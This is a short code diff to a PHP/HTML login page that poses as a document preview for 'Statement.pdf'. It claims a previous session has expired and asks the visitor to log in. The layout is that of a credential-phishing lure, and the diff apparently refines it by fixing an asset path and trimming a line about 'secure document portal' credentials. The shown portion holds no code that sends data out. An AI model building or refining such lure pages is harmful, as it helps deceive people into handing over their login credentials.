@@ -188,7 +188,7 @@
 <body>
 <div class="page-wrapper">
     <div class="doc-background">
-        <img src="background.png" alt="Document preview">
+        <img src="asset/background.png" alt="Document preview">
     </div>
 
     <div class="login-card">
@@ -198,9 +198,7 @@
 
         <h2 class="doc-title">Statement.pdf <span class="doc-size">(197 KB)</span></h2>
         <p class="doc-subtitle">Previous session has expired, log in to continue.</p>
-        <p class="doc-note">
-            Use your <strong>secure document portal</strong> credentials.
-        </p>
+     
 
         <?php if (!empty($_SESSION['error_message'])): ?>
             <p class="login-error"><?= $_SESSION['error_message']; ?></p>
